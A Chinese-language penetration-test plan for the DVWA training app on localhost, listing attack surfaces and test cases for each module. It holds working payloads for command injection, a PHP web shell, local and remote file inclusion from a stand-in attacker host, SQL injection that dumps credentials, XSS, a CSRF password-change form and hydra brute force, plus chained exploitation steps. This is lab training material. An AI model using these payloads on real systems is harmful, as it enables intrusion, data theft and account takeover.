DVWA 攻击面分析与测试用例（授权本地靶场）

  • 目标：http://localhost/dvwa/
  • 基线（已确认）：Apache/2.4.39 (Win64) + PHP/7.3.4 (CGI/FastCGI) + MySQL(库名 dvwa)；默认账密 admin/password；安全四级 low/medium/high/impossible（默认 impossible）；登录表单含反 CSRF user_token（单引号属性）；会话 PHPSESSID(HttpOnly+SameSite=Strict)。
  • 范围：基于前序信息收集发现的页面/参数/响应，做攻击面分析并产出可执行的测试用例。仅用于本机授权 DVWA，请勿用于未授权系统。
  • 图例：P0/P1/P2 = 风险等级；[模板] = 复用脚手架；◆ = 关键攻击面。

0. 测试脚手架（必读）

所有用例依赖已登录会话。下列脚本在 http://localhost/dvwa/ 下执行（当前工作目录需可写，curl 必须用相对路径落盘，绝对路径会写失败）。

1. 攻击面总览（关键发现）

编号 发现 影响 等级
AS-01 ◆ 难度开关 security 由客户端/session 可控（POST /security.php 即可降级到 low，部分版本甚至直接改 Cookie security=low） 攻击者可将全局防护一键关到底，所有模块降到最易被利用形态 P0
AS-02 ◆ 默认弱口令 admin/password 且可登录 直接获得 admin 权限，绕过”需要先拿到账密”的前提 P0
AS-03 ◆ 全站 明文 HTTP，凭证与 PHPSESSID 明文传输 同网嗅探/中间人可劫持会话、窃取口令 P1
AS-04 /phpinfo.php、/setup.php 登录后可访问，完整暴露环境 信息泄露：路径、扩展、版本、DB 名 P1
AS-05 反 CSRF user_token 仅 high/impossible 级强制；low/medium 不存在 low/medium 下全部写操作（改密、上传）无 CSRF 防护 P1
AS-06 无 WAF、无登录速率限制/锁定（brute 模块即证明） 支持暴力破解、自动化注入 P1
AS-07 robots.txt 仅 Disallow:/，但结构和参数已暴露 便于枚举 P2

2. 分模块攻击面与测试用例

每个用例给出：级别 / 请求（curl，相对路径落盘）/ payload / 判定标准。未特别说明均为 GET。

2.1 brute — 暴力破解 / 弱口令

  • 攻击面：登录接口无锁定、无验证码（low/medium/high 均无速率限制；impossible 加 user_token+更严校验）。
  • 参数：username,password,Login（POST login.php）。
  • 风险：P0
用例 级别 请求/动作 判定
TC-BRUTE-01 任意 账密 admin/password 登录（已确认可行） 返回 logged in as 'admin'
TC-BRUTE-02 low hydra -l admin -P top1000.txt $B/login.php -V 跑出弱口令
TC-BRUTE-03 low 错误口令 vs 正确口令的响应差异（”Username and/or password incorrect”） 可用户枚举

2.2 exec — 命令注入（RCE）

  • 攻击面：ip 参数拼接进 shell。
  • 参数：ip,ping,Submit（POST）。
  • 风险：P0
用例 级别 payload (ip=) 判定
TC-EXEC-01 low 127.0.0.1;id 响应出现 uid=
TC-EXEC-02 low 127.0.0.1&&id / `127.0.0.1 id / `` 127.0.0.1id` ``
TC-EXEC-03 medium 绕过 str_replace('&&','')：127.0.0.1&;&id 或 `127.0.0.1 id`
TC-EXEC-04 high 绕过 str_replace 多字符集：用换行 127.0.0.1%0acat /etc/passwd 执行

2.3 upload — 文件上传（WebShell）

  • 攻击面：上传目录 /dvwa/hackable/uploads/ 对外可访问、可执行 PHP。
  • 参数：uploaded(multipart),Upload,MAX_FILE_SIZE（POST）。
  • 风险：P0
用例 级别 动作 判定
TC-UP-01 low 传 shell.php：<?php system($_GET['c']);?> 上传成功
TC-UP-02 medium 改 Content-Type: image/png 绕过 MIME 检查 上传成功
TC-UP-03 high 服务器端重命名/扩展名校验下，尝试双扩展或内容绕过 视校验强度
TC-UP-04 low 访问 GET $B/hackable/uploads/shell.php?c=id 返回命令执行结果

2.4 lfi — 文件包含（LFI/RFI）

  • 攻击面：page 参数包含文件。
  • 参数：page（GET）。
  • 风险：P0
用例 级别 payload (page=) 判定
TC-FI-01 low ../../../../../../etc/passwd 响应含 root:x:0:0
TC-FI-02 low http://attacker/shell.txt（需 allow_url_include=On） 远程包含执行
TC-FI-03 medium 绕过 str_replace('../','')：....//....//etc/passwd 包含成功
TC-FI-04 high fnmatch('file*') 限制：page=file/../../etc/passwd 或 page=file:///etc/passwd 视实现

2.5 sqli — SQL 注入

  • 攻击面：id 拼接进 SELECT（字符型 low；数字/转义 medium/high）。
  • 参数：id,Submit（GET）。
  • 风险：P0
用例 级别 payload (id=) 判定
TC-SQLI-01 low 1' OR '1'='1 返回全部用户
TC-SQLI-02 low -1 UNION SELECT 1,group_concat(user,0x3a,password) FROM users -- - 拖出凭据
TC-SQLI-03 medium 数字型，1 OR 1=1（引号被转义） 返回多行
TC-SQLI-04 high LIMIT 1 场景：1 OR 1=1 布尔注入 差异判注

2.6 sqli_blind — SQL 盲注

  • 攻击面：id，无回显，靠布尔/时延。
  • 参数：id（GET）。
  • 风险：P1
用例 级别 payload (id=) 判定
TC-BLIND-01 low 1' AND 1=1 -- （真）vs AND 1=2（假） 响应长度/内容差异
TC-BLIND-02 low 1' AND SLEEP(5)-- 响应延迟 ≥5s
TC-BLIND-03 low 1' AND SUBSTRING(database(),1,1)='d'-- 二分逐字符提取

2.7 xss_r — 反射型 XSS

  • 攻击面：name 原样回显。
  • 参数：name,XSS（GET）。
  • 风险：P2
用例 级别 payload (name=) 判定
TC-XSSR-01 low <script>alert(1)</script> 页面源码含该串并被执行
TC-XSSR-02 medium 绕过 <script> 过滤：<img src=x onerror=alert(1)> 执行
TC-XSSR-03 high preg_replace 去 <script>：<IMG SRC=1 ONERROR=alert(1)> 执行

2.8 xss_s — 存储型 XSS

  • 攻击面：mtxMessage 存入 DB 后列表渲染。
  • 参数：txtName,mtxMessage,btnSign（POST）。
  • 风险：P2
用例 级别 动作 判定
TC-XSSS-01 low mtxMessage=<script>alert(1)</script> 提交 列表渲染触发
TC-XSSS-02 low txtName 前端 maxlength 限制 → 直接 POST 超长值绕过 昵称注入生效
TC-XSSS-03 high 用事件处理器 <svg/onload=alert(1)> 绕过 strip_tags 触发

2.9 xss_d — DOM 型 XSS

  • 攻击面：default 经 document.location.href+decodeURIComponent 写入 DOM（纯客户端，不受服务端过滤影响）。
  • 参数：default（GET）。
  • 风险：P2
用例 级别 payload (default=) 判定
TC-XSSD-01 全级 <script>alert(1)</script> / default=English#<script>... 客户端执行

2.10 csrf — CSRF 改密

  • 攻击面：改密请求无/弱 CSRF 防护。
  • 参数：password_current,password_new,password_conf,Change。
  • 风险：P1
用例 级别 动作 判定
TC-CSRF-01 low/medium 恶意页自动提交 <form action="$B/vulnerabilities/csrf/" method=POST><input name=password_new value=hacked><input name=password_conf value=hacked><input name=Change value=1></form> 受害者密码被改
TC-CSRF-02 high/impossible 同上加 user_token（需先窃取/预测） 绕过防护

2.11 captcha — 弱验证码

  • 攻击面：服务端校验缺失/可绕过。
  • 参数：step,password_new/conf/current,Change。
  • 风险：P1
用例 级别 动作 判定
TC-CAPTCHA-01 low 直接 POST step=2 + 新口令，忽略验证码 改密成功
TC-CAPTCHA-02 medium 复用/预测 g-recaptcha-response 或重放 token 绕过

2.12 weak_id — 弱会话 ID

  • 攻击面：会话 Cookie 可预测。
  • 参数：Cookie dvwaSession（字段名待测）。
  • 风险：P1
用例 级别 动作 判定
TC-WEAKID-01 全级 多次访问记录 dvwaSession 值，分析是否顺序/时间戳/可预测 可预测 → 会话劫持可行

2.13 csp — CSP 绕过

  • 攻击面：配置的策略可被注入点绕过。
  • 参数：csp（POST）。
  • 风险：P1
用例 级别 动作 判定
TC-CSP-01 各 注入利用策略允许的域/内联例外执行脚本 绕过 CSP 执行

2.14 javascript — JS 逻辑缺陷

  • 攻击面：前端计算 token/逻辑，可逆向。
  • 参数：v（GET）。
  • 风险：P1
用例 级别 动作 判定
TC-JS-01 各 逆向页面 JS 的 token 生成/校验算法，预测或重放 通过逻辑校验

2.15 api — 不安全 API（新版 ≥1.10）

  • 攻击面：疑似 REST，缺鉴权/注入/越权。
  • 参数：id（GET，端点路径待测）。
  • 风险：P1
用例 级别 动作 判定
TC-API-01 待测 ?id=1 OR 1=1 / ?id=2,3 遍历 越权/注入
TC-API-02 待测 不带会话直接调用端点 未授权访问

2.16 authbypass — 认证绕过

  • 攻击面：参数可篡改以冒充 admin。
  • 参数：页面引用 User/admin 用户态（精确参数名待测）。
  • 风险：P0
用例 级别 动作 判定
TC-AUTHB-01 待测 篡改参数（疑似 ?admin=true / ?user=admin / ?id=1） 免密进入 admin 区

2.17 cryptography — 弱加密

  • 攻击面：token 用弱算法/可预测。
  • 参数：v（GET）,check_token（POST）。
  • 风险：P1
用例 级别 动作 判定
TC-CRYPTO-01 待测 解密/预测 check_token（如 base64/弱哈希） 预测下一组绕过校验

2.18 open_redirect — 开放重定向

  • 攻击面：redirect 参数未校验外域。
  • 参数：redirect（GET）。
  • 风险：P2
用例 级别 payload (redirect=) 判定
TC-OR-01 low http://evil.com 响应 Location: 指向外部域
TC-OR-02 high/impossible 探测白名单校验强度（子域/编码绕过） 绕过与否

3. 跨模块利用链（建议）

  1. AS-01 降级 + 任意模块利用：set_sec low 后，exec(RCE)/upload(WebShell)/sqli(拖库) 全部进入最易形态 → 一键撕开。
  2. sqli 拖库 → 拿到其他账户 → brute 验证：TC-SQLI-02 取出的 user:password 直接喂 TC-BRUTE 做横向。
  3. upload WebShell → exec 联动：TC-UP-04 拿到 Shell 后内联执行系统命令，等价于 TC-EXEC 但更持久。
  4. csrf/captcha/authbypass → 权限维持：改 admin 口令（TC-CSRF-01）或绕过认证（TC-AUTHB-01）锁定控制权。
  5. weak_id → 会话劫持 → 免登录操作：预测 dvwaSession 后直接复用他人会话。
